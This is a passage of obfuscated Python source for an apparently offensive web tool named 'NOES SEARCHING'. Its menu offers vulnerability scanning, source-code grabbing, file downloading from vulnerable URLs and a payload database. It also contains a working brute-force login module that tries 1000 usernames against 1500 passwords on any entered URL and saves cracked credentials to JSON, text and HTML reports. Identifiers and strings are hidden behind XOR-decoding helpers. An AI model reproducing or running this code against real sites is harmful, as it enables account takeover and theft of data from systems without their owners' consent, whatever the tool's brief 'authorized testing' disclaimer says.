                        _lIlOI1IOl00III11II(f'[Noes] ✅ VERIFIED: {username}:{password} - Login works!', _O01IIlOIlI(b'y@\x1a\x87\xba\x0b\xef\x06\xaa\xedIh\xfd', b'd\xd6Y\r'))
                except:
                    pass
    elapsed = int(time.time() - _lI1lOOl1I0OllOOl)
    if found:
        _lIlOI1IOl00III11II(f'[Noes] BRUTE COMPLETE - Found: {len(found)} credentials | Time: {elapsed}s', _0011111Il1O1llOllI(b'Mr4a\x81\x01\xba', b'\xb2\xf6\x80+'))
        _lIlOI1IOl00III11II(f'[Noes] ✅ CREDENTIALS FOUND:', _11OO0OO1llIlI(b'\x8a\x02\xbf\xb2\x18\xce\xf6\xc5ev\x8e;\xeb', b'\x02\x04\x95\x86'))
        for _OO1l0OO0OI, _ll0l10lIIO01I in enumerate(found, 1779411425 ^ 1779411424):
            _lIlOI1IOl00III11II(f"  {_OO1l0OO0OI}. {_ll0l10lIIO01I['username']}:{_ll0l10lIIO01I['password']} - {_ll0l10lIIO01I.get('login_url', 'N/A')}", _0011111Il1O1llOllI(b'\xd9k\xff\xe9L\xfe\xecg\xc85i\xd8\x83', b'\x89\x8e\xd8\xca'))
        with open(_lOO11llOIl0l1lOI1l, _0011111Il1O1llOllI(b'\xdb', b'\xba\x13!j')) as _ll0l10lIIO01I:
            json.dump(found, _ll0l10lIIO01I, indent=1373025668 ^ 1373025670)
        with open(_l1I0OllIOI, _0011111Il1O1llOllI(b'\x8b', b'\r\xc7@9')) as _ll0l10lIIO01I:
            _ll0l10lIIO01I.write(f'BRUTE FORCE RESULTS - {base_url}\n')
            _ll0l10lIIO01I.write(f'Generated: {_IO1111llIOOO11l()}\n')
            _ll0l10lIIO01I.write(f'Time: {elapsed}s\n')
            _ll0l10lIIO01I.write(f'Combinations tested: {tested}\n')
            _ll0l10lIIO01I.write(f'Credentials found: {len(found)}\n')
            _ll0l10lIIO01I.write(_O01IIlOIlI(b'\xb9', b'\xe6\xc6\xe5\x81') * (1372780173 ^ 1372780209) + _O01IIlOIlI(b'\xc5\xdd', b',2\x17\xda'))
            for e in found:
                _ll0l10lIIO01I.write(f"Username: {e['username']}\n")
                _ll0l10lIIO01I.write(f"Password: {e['password']}\n")
                _ll0l10lIIO01I.write(f"Login URL: {e.get('login_url', 'N/A')}\n")
                _ll0l10lIIO01I.write(_11OO0OO1llIlI(b'\xcd', b'\xb1\x975\xa3') * (744645365 ^ 744645341) + _O01IIlOIlI(b'\x9f', b'\xc2\x93\xa7\xdf'))
        _lIlOI1IOl00III11II(f'[Noes] Results saved: {_l1I0OllIOI}', _O01IIlOIlI(b'\xb498\x9ct\xc3/', b'V\xf9\xe3\x8a'))
        _lIlOI1IOl00III11II(f'[Noes] Results saved: {_lOO11llOIl0l1lOI1l}', _0011111Il1O1llOllI(b'\xaa2\xb4E\xe2i\xee', b'\x13\xf2\x92\xb2'))
    else:
        _lIlOI1IOl00III11II(f'[Noes] BRUTE COMPLETE - No credentials found | Time: {elapsed}s', _0011111Il1O1llOllI(b'\x15QI\xce\x94*J', b'{\x1a\x9bX'))
        _lIlOI1IOl00III11II(f'[Noes] Tested: {tested} combinations', _0011111Il1O1llOllI(b',\x9bv\x83', b'($*\x9f'))

def _OIO00000l1OIIl1():
    _IOI000O000()
    print(_10lOOl1I1Il0I11)
    total_vulns = len(_lO1lO1111l)
    _l101O1I11lIl101 = len(_ll1l00O1110)
    _llI1lll0lIIOO0II0 = len(_IO0lll0OII0O)
    _0OOO00OIl01I0OO1II = _0lOOII1IO1OlIllII(b'\xba\r\x10\x02\x80\xecvo\xb2=\xa9\x9e\xf0', b'\xec\xfaA\xd2') if _I1O1I10lO01O else _11OO0OO1llIlI(b'\x8bGa7\x8ey\xfde\x9b\xc5', b'\\\xae\xc5X')
    print(f'\n{_Olll0O10Il0O1010I.YELLOW}MAIN MENU\n{_Olll0O10Il0O1010I.CYAN}\n[ 1 ] SCAN SINGLE WEBSITE\n      Scan one target for vulnerabilities (12 categories)\n[ 2 ] SCAN MULTIPLE URLS (list.txt)\n      Scan all URLs from list.txt\n[ 3 ] VIEW SCAN RESULTS\n      Display all found vulnerabilities\n[ 4 ] GET SOURCE CODE\n      Grab full source code from vulnerability URL\n[ 5 ] DOWNLOAD FILE\n      Download file from vulnerability URL\n[ 6 ] VIEW DOWNLOADED FILES\n      List all downloaded files\n[ 7 ] BRUTE FORCE LOGIN\n      Try 1000 usernames + 1500 passwords combinations\n[ 8 ] VIEW LOGS\n      Display activity logs\n[ 9 ] EXPORT HTML REPORT\n      Generate HTML report\n[ 10] PAYLOAD DATABASE\n      View all payloads (12 categories)\n[ 11] CLEAR LOGS & RESET\n      Clear all logs and results\n[ A ] ABOUT / INFO\n      About this tool\n[ 0 ] EXIT\n      Exit {_l01Il0Ol1lO10}\n\n{_Olll0O10Il0O1010I.GREEN}STATUS          : {_0OOO00OIl01I0OO1II}\nVULNS FOUND     : {total_vulns}\nFILES DOWNLOADED: {_l101O1I11lIl101}\nBRUTE FOUND     : {_llI1lll0lIIOO0II0}\nTIME            : {_1O0I11II1OIOIOl()}\n{_Olll0O10Il0O1010I.YELLOW}\n    ')

def _IlI0l00O1010Ol0l():
    _IOI000O000()
    print(f'\n{_Olll0O10Il0O1010I.CYAN}ABOUT {_l01Il0Ol1lO10} v{_I0lOll0000O}\n\n{_Olll0O10Il0O1010I.GREEN}Name         : {_l01Il0Ol1lO10}\nDeveloper    : {_O10I011l0O1I11IIl}\nGitHub       : {_O10lIllIl00O}\nSystem       : Noes Search\nPlatform     : {_Ol0lOOO0IllIl00I.system()} {_Ol0lOOO0IllIl00I.machine()}\nMode         : {_Olll0O10Il0O1010I.RED}\n\n{_Olll0O10Il0O1010I.YELLOW}DESCRIPTION:\n{_Olll0O10Il0O1010I.WHITE}NOES SEARCHING is a professional vulnerability scanner\nand source code grabber. Detects JSON leaks, sensitive files,\nadmin panels, API exposures, directory traversals, and more.\nIncludes brute force login testing module with 1000+ usernames\nand 1500+ passwords.\n\n{_Olll0O10Il0O1010I.YELLOW}FEATURES:\n{_Olll0O10Il0O1010I.WHITE}• 12 Category Payload Scanner (UPGRADE)\n• Source Code Grabber (saves to hasilnya/datahasil/)\n• Multi-Threading ({_1O0llO01lIllIl1l1} threads)\n• Brute Force Login Module (1000 usernames, 1500 passwords)\n• Real-time Logs with progress\n• HTML Report Export\n• Download Manager\n• Severity Classification\n• {_Olll0O10Il0O1010I.RED}Mode Search By Noes\n\n{_Olll0O10Il0O1010I.RED}WARNING:\n{_Olll0O10Il0O1010I.WHITE}• Use only for educational & authorized testing\n• Developer is not responsible for misuse\n• All actions are logged in real-time\n\n{_Olll0O10Il0O1010I.CYAN}\n    ')
    input(f'{_Olll0O10Il0O1010I.CYAN}Press Enter to return...{_Olll0O10Il0O1010I.RESET}')

def _0IlO010O10I00O1lll():
    _IOI000O000()
    data = _00OOOllI1OOIIl0()
    if not data or not data.get(_O01IIlOIlI(b'Wp\x0f\xd8.\x8c\x1c', b'\x88\xf5T\xe0')):
        print(f'{_Olll0O10Il0O1010I.RED}No scan results found.{_Olll0O10Il0O1010I.RESET}')
        input(_11OO0OO1llIlI(b'\x95\xb7\x87Xk\xea\xc7\x9e\x1c7u\xb4or', b'\xa10\x08/'))
        return
    results = data.get(_O01IIlOIlI(b'\xae\xa78?\x8cwk', b'L\x14\xd4S'), [])
    if not results:
        print(f'{_Olll0O10Il0O1010I.YELLOW}No vulnerabilities found.{_Olll0O10Il0O1010I.RESET}')
        input(_0lOOII1IO1OlIllII(b'\xa0l\xee9mW\x88W\x1a%,\xf8\xd7z', b'/\xf6\xc8\xe9'))
        return
    print(f'{_Olll0O10Il0O1010I.GREEN}SCAN RESULTS - {_l01Il0Ol1lO10}{_Olll0O10Il0O1010I.RESET}')
    print(f'{_Olll0O10Il0O1010I.CYAN}Total: {len(results)} vulnerabilities{_Olll0O10Il0O1010I.RESET}')
    print()
    critical = [v for v in results if v.get(_0lOOII1IO1OlIllII(b'&\x8d~oEs\xaf\x19', b'\xa7\r\x90\xc2')) == _0lOOII1IO1OlIllII(b'sWNA\xf2/\xb3L', b'~\xc6\x1d\x19')]
    high = [v for v in results if v.get(_0011111Il1O1llOllI(b'\x89\x1c\xa9+`?\xe6&', b'T6;\x06')) == _O01IIlOIlI(b'\xb4eV\xf6', b'\x9f\xf9"\x80')]
    medium = [v for v in results if v.get(_0lOOII1IO1OlIllII(b"'\xf3\xcd$S\x0b\xe3\xb2", b'\xd6m\x8c\xfd')) == _11OO0OO1llIlI(b'\\\x15f^\xf3\xbf', b'{q\xb6\xb1')]
    low = [v for v in results if v.get(_11OO0OO1llIlI(b'\xa0\xf9\xfb\xa9L\xa0\x1e1', b'z\xd6\xa6\x98')) == _O01IIlOIlI(b'\x9d\xa8%', b"\xb6F'\x89")]
    if critical:
        print(f'{_Olll0O10Il0O1010I.RED}CRITICAL ({len(critical)}){_Olll0O10Il0O1010I.RESET}')
        for v in critical[:1838903149 ^ 1838903138]:
            print(f"  {_Olll0O10Il0O1010I.RED}• {v.get('url', 'N/A')}{_Olll0O10Il0O1010I.RESET}")
        print()
    if high:
        print(f'{_Olll0O10Il0O1010I.YELLOW}HIGH ({len(high)}){_Olll0O10Il0O1010I.RESET}')
        for v in high[:1304283386 ^ 1304283381]:
            print(f"  {_Olll0O10Il0O1010I.YELLOW}• {v.get('url', 'N/A')}{_Olll0O10Il0O1010I.RESET}")
        print()
    if medium:
        print(f'{_Olll0O10Il0O1010I.CYAN}MEDIUM ({len(medium)}){_Olll0O10Il0O1010I.RESET}')
        for v in medium[:463134387 ^ 463134396]:
            print(f"  {_Olll0O10Il0O1010I.CYAN}• {v.get('url', 'N/A')}{_Olll0O10Il0O1010I.RESET}")
        print()
    if low:
        print(f'{_Olll0O10Il0O1010I.WHITE}LOW ({len(low)}){_Olll0O10Il0O1010I.RESET}')
        for v in low[:1789030853 ^ 1789030858]:
            print(f"  {_Olll0O10Il0O1010I.WHITE}• {v.get('url', 'N/A')}{_Olll0O10Il0O1010I.RESET}")
        print()
    input(f'{_Olll0O10Il0O1010I.CYAN}Press Enter to return...{_Olll0O10Il0O1010I.RESET}')

def _1IOI011I01I0I1O():
    _IOI000O000()
    data = _00OOOllI1OOIIl0()
    if not data or not data.get(_0lOOII1IO1OlIllII(b'!\x87\xb7\xd4\xdfV#', b'-\x82Ti')):
        print(f'{_Olll0O10Il0O1010I.RED}No results found. Run a scan first.{_Olll0O10Il0O1010I.RESET}')
        input(_11OO0OO1llIlI(b'\x12#TJ\xca\x9f\xeeu8\xec\x89\xb1\xc5x', b't\xf2\x93s'))
        return
    results = data.get(_11OO0OO1llIlI(b'\x8d{q\x9f\x03\x07\xbb', b'n\xb3@\x08'), [])
    print(f'{_Olll0O10Il0O1010I.GREEN}GET SOURCE CODE{_Olll0O10Il0O1010I.RESET}')
    print(f'{_Olll0O10Il0O1010I.CYAN}Select URL to grab source:{_Olll0O10Il0O1010I.RESET}\n')
    _1OlIl1IlI01lI = []
    for _l0OI1111101I00ll, v in enumerate(results, 942615214 ^ 942615215):
        url = v.get(_0lOOII1IO1OlIllII(b'\x02\xaf\xc6', b'\xab\xcb\xc8\xf1'), _0011111Il1O1llOllI(b'', b'\xe0s\x94\xb1'))
        vuln_type = v.get(_O01IIlOIlI(b'\x85\\\xcb1g\xfa\xc5_J', b'\x98?\x86\xac'), _0011111Il1O1llOllI(b'@\xeb\x01\x91\xafq-', b'u\xe5\x94\xe1'))
        _1OlIl1IlI01lI.append(v)
        print(f'{_Olll0O10Il0O1010I.GREEN}[{_l0OI1111101I00ll}] {_Olll0O10Il0O1010I.WHITE}{url}')
        print(f'    {_Olll0O10Il0O1010I.CYAN}Type: {vuln_type}{_Olll0O10Il0O1010I.RESET}')
    print()
    choice = input(f"{_Olll0O10Il0O1010I.CYAN}Select number (or 'all', 0=back): {_Olll0O10Il0O1010I.WHITE}")
    if choice == _0011111Il1O1llOllI(b'Q', b'\xce6\xb5\xef'):
        return
    elif choice.lower() == _0011111Il1O1llOllI(b'\xe0\x1fj', b'Rm\xc6\x9c'):
        _Ol01O111l0 = 1647713919 ^ 1647713919
        for v in _1OlIl1IlI01lI:
            if _IlOOIII1lI(v.get(_O01IIlOIlI(b'7\xd8]', b'\x83\x9b\xdc\xd4'), _0011111Il1O1llOllI(b'', b'\x9e9#\xd8'))):
                _Ol01O111l0 += 1470045856 ^ 1470045857
        print(f'{_Olll0O10Il0O1010I.GREEN}Grabbed {_Ol01O111l0} source codes to {_I00000I0lI1}{_Olll0O10Il0O1010I.RESET}')
    elif choice.isdigit():
        _l0OI1111101I00ll = int(choice) - (1324831284 ^ 1324831285)
        if 492463253 ^ 492463253 <= _l0OI1111101I00ll < len(_1OlIl1IlI01lI):
            if _IlOOIII1lI(_1OlIl1IlI01lI[_l0OI1111101I00ll].get(_0lOOII1IO1OlIllII(b'U\xa4J', b'!.\x8d\x1e'), _0lOOII1IO1OlIllII(b'', b'\xc9\x177\x8e'))):
                print(f'{_Olll0O10Il0O1010I.GREEN}Source saved to {_I00000I0lI1}{_Olll0O10Il0O1010I.RESET}')
        else:
            print(f'{_Olll0O10Il0O1010I.RED}Invalid number!{_Olll0O10Il0O1010I.RESET}')
    else:
        print(f'{_Olll0O10Il0O1010I.RED}Unknown choice!{_Olll0O10Il0O1010I.RESET}')
    input(f'\n{_Olll0O10Il0O1010I.CYAN}Press Enter to return...{_Olll0O10Il0O1010I.RESET}')

def _I0OOO0l01l1lOO0OI0():
    _IOI000O000()
    data = _00OOOllI1OOIIl0()
    if not data or not data.get(_O01IIlOIlI(b'\x94Y\xbf\xde\xfaG=', b'\xea\xe9X\x06')):
        print(f'{_Olll0O10Il0O1010I.RED}No results found.{_Olll0O10Il0O1010I.RESET}')
        input(_0lOOII1IO1OlIllII(b'_e\xef\xe1} \x96\xcd\n\xecU\xc2\x82\xc5', b'|\xe4r\x9e'))
        return
    results = data.get(_0lOOII1IO1OlIllII(b'\x88\xffW\x14\xec@\xc7', b'A\xa6\xa6\xfa'), [])
    print(f'{_Olll0O10Il0O1010I.GREEN}DOWNLOAD FILE{_Olll0O10Il0O1010I.RESET}')
    print(f'{_Olll0O10Il0O1010I.CYAN}Select file to download:{_Olll0O10Il0O1010I.RESET}\n')
    for _l1OII01OO101IOl1O, v in enumerate(results, 477702839 ^ 477702838):
        url = v.get(_0lOOII1IO1OlIllII(b'\xfeI+', b'\xe2\x88\xc1\xa6'), _11OO0OO1llIlI(b'', b'\x8a\xee4\x1f'))
        vuln_type = v.get(_0lOOII1IO1OlIllII(b'\xc2\x17u\x80W\x1a[<>', b'x\xa7\x8b\x7f'), _O01IIlOIlI(b'\xf9V\x0c:\xb1w\xae', b'\xb3\xd5\xa4\xc8'))
        print(f'{_Olll0O10Il0O1010I.GREEN}[{_l1OII01OO101IOl1O}] {_Olll0O10Il0O1010I.WHITE}{url}')
        print(f'    {_Olll0O10Il0O1010I.CYAN}Type: {vuln_type}{_Olll0O10Il0O1010I.RESET}')
    print()
    choice = input(f"{_Olll0O10Il0O1010I.CYAN}Select number (or 'all', 0=back): {_Olll0O10Il0O1010I.WHITE}")
    if choice == _0011111Il1O1llOllI(b'!', b'\x031\xfds'):
        return
    elif choice.lower() == _11OO0OO1llIlI(b'\xcf\xd3V', b'y\xf8\xb1S'):
        _10IIl010O0I1l0IlOI = 1574467880 ^ 1574467880
        for v in results:
            url = v.get(_0lOOII1IO1OlIllII(b'\xa5\x04"', b'~W\x1e\xab'), _O01IIlOIlI(b'', b'B\x05ug'))
            filename = url.split(_O01IIlOIlI(b'\xa1', b'tv\xf0\xd7'))[-(2140038626 ^ 2140038627)] or f'file_{_0l1OOIlOIIIlII110l.md5(url.encode()).hexdigest()[:8]}.html'
            if _IOI01O0l10l0(url, filename):
                _10IIl010O0I1l0IlOI += 130001534 ^ 130001535
        print(f'{_Olll0O10Il0O1010I.GREEN}Downloaded {_10IIl010O0I1l0IlOI} files to {_I00000I0lI1}{_Olll0O10Il0O1010I.RESET}')
    elif choice.isdigit():
        _l1OII01OO101IOl1O = int(choice) - (781546058 ^ 781546059)
        if 477860545 ^ 477860545 <= _l1OII01OO101IOl1O < len(results):
            v = results[_l1OII01OO101IOl1O]
            url = v.get(_0lOOII1IO1OlIllII(b'\xc4\xdd=', b'\x87\xb4\xc9c'), _0011111Il1O1llOllI(b'', b'p#be'))
            filename = url.split(_0011111Il1O1llOllI(b'9', b'%\xa2\xd6\xa3'))[-(172143010 ^ 172143011)] or f'file_{_0l1OOIlOIIIlII110l.md5(url.encode()).hexdigest()[:8]}.html'
            if _IOI01O0l10l0(url, filename):
                print(f'{_Olll0O10Il0O1010I.GREEN}File saved to {_I00000I0lI1}{_Olll0O10Il0O1010I.RESET}')
        else:
            print(f'{_Olll0O10Il0O1010I.RED}Invalid number!{_Olll0O10Il0O1010I.RESET}')
    else:
        print(f'{_Olll0O10Il0O1010I.RED}Unknown choice!{_Olll0O10Il0O1010I.RESET}')
    input(f'\n{_Olll0O10Il0O1010I.CYAN}Press Enter to return...{_Olll0O10Il0O1010I.RESET}')

def _100I1000I10():
    _IOI000O000()
    if not _ll1l00O1110:
        print(f'{_Olll0O10Il0O1010I.YELLOW}No files downloaded yet.{_Olll0O10Il0O1010I.RESET}')
        input(_11OO0OO1llIlI(b'Vx\xfe\x8a,\x89\xe9_\xd4\x14-@\xa6\x93', b'\xa70\tY'))
        return
    print(f'{_Olll0O10Il0O1010I.GREEN}DOWNLOADED FILES{_Olll0O10Il0O1010I.RESET}')
    print(f'{_Olll0O10Il0O1010I.CYAN}Total: {len(_ll1l00O1110)} files{_Olll0O10Il0O1010I.RESET}\n')
    _l10110lOOl = 1082418376 ^ 1082418376
    for _1101OlO10IIIl, _10l1lIllOOO in enumerate(_ll1l00O1110, 1284645330 ^ 1284645331):
        size = _10l1lIllOOO.get(_O01IIlOIlI(b'\xf3\x86G\x19', b'\x8c\x06\x19\x7f'), 68586044 ^ 68586044)
        _l10110lOOl += size
        _l0ll0O00lO11lOIl = size // (1239295821 ^ 1239294797)
        print(f"{_Olll0O10Il0O1010I.GREEN}[{_1101OlO10IIIl}] {_Olll0O10Il0O1010I.WHITE}{_10l1lIllOOO.get('filename', 'N/A')}")
        print(f"    {_Olll0O10Il0O1010I.CYAN}Size: {_l0ll0O00lO11lOIl} KB | Path: {_10l1lIllOOO.get('path', 'N/A')}{_Olll0O10Il0O1010I.RESET}")
    _I1OlO10l11O1l = _l10110lOOl // (1039419954 ^ 1039420978)
    print(f'\n{_Olll0O10Il0O1010I.CYAN}Total Size: {_I1OlO10l11O1l} KB{_Olll0O10Il0O1010I.RESET}')
    input(f'\n{_Olll0O10Il0O1010I.CYAN}Press Enter to return...{_Olll0O10Il0O1010I.RESET}')

def _lII1O0Ol1OIO0():
    _IOI000O000()
    print(f'{_Olll0O10Il0O1010I.GREEN}BRUTE FORCE LOGIN - ULTIMATE MODE{_Olll0O10Il0O1010I.RESET}')
    print(f'{_Olll0O10Il0O1010I.CYAN}Usernames: {len(_Il11Ol00OIlO0IlI00)} | Passwords: {len(_1O0000llII1Il)}{_Olll0O10Il0O1010I.RESET}')
    print(f'{_Olll0O10Il0O1010I.CYAN}Total Combinations: {len(_Il11Ol00OIlO0IlI00) * len(_1O0000llII1Il)}{_Olll0O10Il0O1010I.RESET}')
    print(f'{_Olll0O10Il0O1010I.YELLOW}Logs akan menampilkan progress setiap 100 percobaan{_Olll0O10Il0O1010I.RESET}')
    print(f'{_Olll0O10Il0O1010I.YELLOW}Hasil yang ditemukan akan langsung ditampilkan di logs{_Olll0O10Il0O1010I.RESET}')
    print()
    url = input(f'{_Olll0O10Il0O1010I.CYAN}Enter target URL: {_Olll0O10Il0O1010I.WHITE}')
    if not url:
        return
    print(f'{_Olll0O10Il0O1010I.RED}Memulai BRUTE FORCE... Lihat logs untuk progress!{_Olll0O10Il0O1010I.RESET}')
    print(f'{_Olll0O10Il0O1010I.YELLOW}Ini akan memakan waktu, bersabarlah...{_Olll0O10Il0O1010I.RESET}')
    print()
    _00010001I0OO10OlOl(url)
    input(f'\n{_Olll0O10Il0O1010I.CYAN}Press Enter to return...{_Olll0O10Il0O1010I.RESET}')

def _0Ol0101OOOOl():
    _IOI000O000()
    if not _IlIIOI11I1.path.exists(_l0l0I0lI1I):
        print(f'{_Olll0O10Il0O1010I.YELLOW}No logs found.{_Olll0O10Il0O1010I.RESET}')
        input(_0011111Il1O1llOllI(b'N?\xec\xef*Gj\xe8\xe9-K\xcc=\xb7', b'\x7f\xbaw\xd1'))
        return
    print(f'{_Olll0O10Il0O1010I.GREEN}REAL-TIME LOGS{_Olll0O10Il0O1010I.RESET}\n')
    try:
        with open(_l0l0I0lI1I, _11OO0OO1llIlI(b'\xef', b'z\x96<\x06'), encoding=_O01IIlOIlI(b's1\xa1y\x9e', b'~\x02A='), errors=_0lOOII1IO1OlIllII(b'\x86i\xa8\xe4\xce\xb7', b'z\xdb\xfe\xf7')) as _1Ol1lIII0OI0lO0O:
            lines = _1Ol1lIII0OI0lO0O.readlines()
            _l1O0Il001OO0l0I = max(1764119925 ^ 1764119925, len(lines) - (1255406654 ^ 1255406662))
            for _1IlIOlOOII00111I in lines[_l1O0Il001OO0l0I:]:
                _1IlIOlOOII00111I = _1IlIOlOOII00111I.strip()
                if not _1IlIOlOOII00111I:
                    continue
                if _O01IIlOIlI(b'\xfa<\xd5r', b'\x9d\x98\rc') in _1IlIOlOOII00111I or _0lOOII1IO1OlIllII(b'\xc3\xa4J\xf6)J\x1d\xf3', b'`\xd7\x8b\x0b') in _1IlIOlOOII00111I:
                    print(f'{_Olll0O10Il0O1010I.RED}{_1IlIOlOOII00111I}{_Olll0O10Il0O1010I.RESET}')
                elif _0011111Il1O1llOllI(b'\x88\xc9GY\x0f^', b'T8\x9f\x0c') in _1IlIOlOOII00111I or _0011111Il1O1llOllI(b'\xb6/\x964@\x94\x88\xc0', b'\x89\xd6\x1f\x99') in _1IlIOlOOII00111I:
                    print(f'{_Olll0O10Il0O1010I.BLUE}{_1IlIOlOOII00111I}{_Olll0O10Il0O1010I.RESET}')
                elif _0011111Il1O1llOllI(b'\xfb\xfe\xf2]B\xd5W', b'\x96\x11\xf3\x17') in _1IlIOlOOII00111I or _0011111Il1O1llOllI(b'b\x162S\xfd', b'\xcb>\xe0\xcc') in _1IlIOlOOII00111I:
                    print(f'{_Olll0O10Il0O1010I.GREEN}{_1IlIOlOOII00111I}{_Olll0O10Il0O1010I.RESET}')
                elif _0lOOII1IO1OlIllII(b"\x15'\xd2\x8d\xd6\xa3/", b'\xaf\x0b\xa6i') in _1IlIOlOOII00111I:
                    print(f'{_Olll0O10Il0O1010I.YELLOW}{_1IlIOlOOII00111I}{_Olll0O10Il0O1010I.RESET}')
                elif _0lOOII1IO1OlIllII(b'sR8>\x8e', b"[\xef\xb7'") in _1IlIOlOOII00111I:
                    print(f'{_Olll0O10Il0O1010I.RED}{_1IlIOlOOII00111I}{_Olll0O10Il0O1010I.RESET}')
                elif _0011111Il1O1llOllI(b'.\xc9_\x00R', b'\xf6H\xa8\x0c') in _1IlIOlOOII00111I:
                    print(f'{_Olll0O10Il0O1010I.MAGENTA}{_1IlIOlOOII00111I}{_Olll0O10Il0O1010I.RESET}')
                elif _O01IIlOIlI(b'B\x9a]\x9e\xde\xfbk\xf3P\xf7n\rL', b'\xe5\x9b6^') in _1IlIOlOOII00111I:
                    print(f'{_Olll0O10Il0O1010I.GREEN}{_lI1OOIlI1O0l0.BRIGHT}{_1IlIOlOOII00111I}{_Olll0O10Il0O1010I.RESET}')
                else:
                    print(_1IlIOlOOII00111I)
    except Exception as e:
        print(f'{_Olll0O10Il0O1010I.RED}Error: {e}{_Olll0O10Il0O1010I.RESET}')
    print(f'\n{_Olll0O10Il0O1010I.CYAN}Showing last 120 lines{_Olll0O10Il0O1010I.RESET}')
    input(f'\n{_Olll0O10Il0O1010I.CYAN}Press Enter to return...{_Olll0O10Il0O1010I.RESET}')

def _l0I10101I00():
    data = _00OOOllI1OOIIl0()
    if not data or not data.get(_O01IIlOIlI(b'\xecV@\xd6\x17`q', b'mD\xe3\xcb')):
        print(f'{_Olll0O10Il0O1010I.RED}No results to export!{_Olll0O10Il0O1010I.RESET}')
        input(_0011111Il1O1llOllI(b'\xa0\x8f_Pcr\x00;\xb50I\x97\xc0\xd5', b'\xcd\xf5\xde\xd7'))
        return
    results = data.get(_0011111Il1O1llOllI(b'\xb1\xea\xb7\xd9\xb4O\xdf', b'\xe1b\xf6\x83'), [])
    brute_found = data.get(_11OO0OO1llIlI(b':\n\x18W)\x10\xdd\x84\xa8\xd0V', b'\xf0\xe33\x92'), [])
    html = f"""<!DOCTYPE html>\n<html>\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>{_l01Il0Ol1lO10} - Report</title>\n    <style>\n        * {{ margin: 0; padding: 0; box-sizing: border-box; }}\n        body {{ background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }}\n        .container {{ max-width: 1200px; margin: 0 auto; }}\n        h1 {{ color: #ff4444; border-bottom: 2px solid #ff4444; padding-bottom: 10px; }}\n        h2 {{ color: #ff8844; margin: 20px 0 10px 0; }}\n        .header {{ background: #1a1a1a; padding: 20px; border-radius: 10px; margin-bottom: 20px; }}\n        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin: 15px 0; }}\n        .stat {{ background: #0a0a0a; padding: 10px 15px; border-radius: 5px; border: 1px solid #333; }}\n        .stat .label {{ color: #888; font-size: 12px; }}\n        .stat .value {{ color: #00ff00; font-size: 20px; font-weight: bold; }}\n        .vuln {{ background: #1a1a1a; padding: 12px; margin: 8px 0; border-left: 4px solid #ff4444; border-radius: 5px; }}\n        .vuln.critical {{ border-color: #ff0000; background: #2a0000; }}\n        .vuln.high {{ border-color: #ff8800; background: #2a1a00; }}\n        .vuln.medium {{ border-color: #ffcc00; background: #1a1a00; }}\n        .vuln.low {{ border-color: #00ccff; background: #001a2a; }}\n        .vuln .url {{ color: #00ccff; word-break: break-all; }}\n        .vuln .type {{ color: #ffff00; font-size: 13px; }}\n        .vuln .meta {{ color: #888; font-size: 12px; }}\n        .brute {{ background: #2a0044; border-left: 4px solid #ff44ff; padding: 12px; margin: 8px 0; border-radius: 5px; }}\n        .brute .creds {{ color: #ff44ff; font-weight: bold; }}\n        .brute .url {{ color: #00ccff; }}\n        .footer {{ margin-top: 30px; padding-top: 20px; border-top: 1px solid #333; text-align: center; color: #666; font-size: 12px; }}\n        .badge {{ display: inline-block; background: #ff4444; color: #fff; padding: 2px 8px; border-radius: 3px; font-size: 10px; }}\n        .badge.critical {{ background: #ff0000; }}\n        .badge.high {{ background: #ff8800; }}\n        .badge.medium {{ background: #ffcc00; color: #000; }}\n        .badge.low {{ background: #00ccff; color: #000; }}\n        .badge.success {{ background: #00ff00; color: #000; }}\n    </style>\n</head>\n<body>\n<div class="container">\n    <div class="header">\n        <h1>{_l01Il0Ol1lO10} v{_I0lOll0000O} - Report</h1>\n        <div class="stats">\n            <div class="stat"><div class="label">Total Vulns</div><div class="value">{len(results)}</div></div>\n            <div class="stat"><div class="label">Downloaded</div><div class="value">{len(_ll1l00O1110)}</div></div>\n            <div class="stat"><div class="label">Brute Found</div><div class="value">{len(brute_found)}</div></div>\n            <div class="stat"><div class="label">Generated</div><div class="value" style="font-size:14px;">{_IO1111llIOOO11l()}</div></div>\n        </div>\n    </div>\n    \n    <h2>Vulnerabilities</h2>"""
    for v in results:
        severity = v.get(_0011111Il1O1llOllI(b'\xc8\x15\x88\xee\x89b\x8en', b'\xcf\x87 \xd5'), _0lOOII1IO1OlIllII(b'\xdcG{', b'N\x13^\xab')).lower()
        html += f"""\n    <div class="vuln {severity}">\n        <div class="url">{v.get('url', 'N/A')}</div>\n        <div class="type">Type: {v.get('vuln_type', 'Unknown')} <span class="badge {severity}">{v.get('severity', 'LOW')}</span></div>\n        <div class="meta">Status: {v.get('status', 'N/A')} | Size: {v.get('size', 0)} bytes</div>\n    </div>"""
    if brute_found:
        html += f'\n    <h2>Brute Force Results</h2>'
        for _11Ill0lI0lI in brute_found:
            html += f"""\n    <div class="brute">\n        <div class="creds">✅ Username: {_11Ill0lI0lI.get('username')} | Password: {_11Ill0lI0lI.get('password')}</div>\n        <div class="url">Login URL: {_11Ill0lI0lI.get('login_url', 'N/A')}</div>\n        <div class="meta">Found: {_11Ill0lI0lI.get('timestamp', 'N/A')}</div>\n    </div>"""
    html += f'\n    <div class="footer">\n        {_l01Il0Ol1lO10} v{_I0lOll0000O} | Developer: {_O10I011l0O1I11IIl}<br>\n        GitHub: {_O10lIllIl00O} | Mode: SEARCH\n    </div>\n</div>\n</body>\n</html>'
    _O01l0l1IlIOII00l = _IlIIOI11I1.path.join(_I00000I0lI1, _O01IIlOIlI(b'\x1b\x80\x87}p\x9eO\x13\x9e\x16\xda', b'"\xdb\x9d='))
    with open(_O01l0l1IlIOII00l, _0011111Il1O1llOllI(b'j', b'\x03=\xda\x9e'), encoding=_O01IIlOIlI(b'\xa4\xa6pK\xc4', b'\x95\x83\x8eh')) as _OO1OlI0l0l10:
        _OO1OlI0l0l10.write(html)
    print(f'{_Olll0O10Il0O1010I.GREEN}Report saved: {_O01l0l1IlIOII00l}{_Olll0O10Il0O1010I.RESET}')
    input(f'\n{_Olll0O10Il0O1010I.CYAN}Press Enter to return...{_Olll0O10Il0O1010I.RESET}')

def _1I01Ol1I01IOll():
    _IOI000O000()
    print(f'{_Olll0O10Il0O1010I.GREEN}PAYLOAD DATABASE - 12 Categories{_Olll0O10Il0O1010I.RESET}\n')
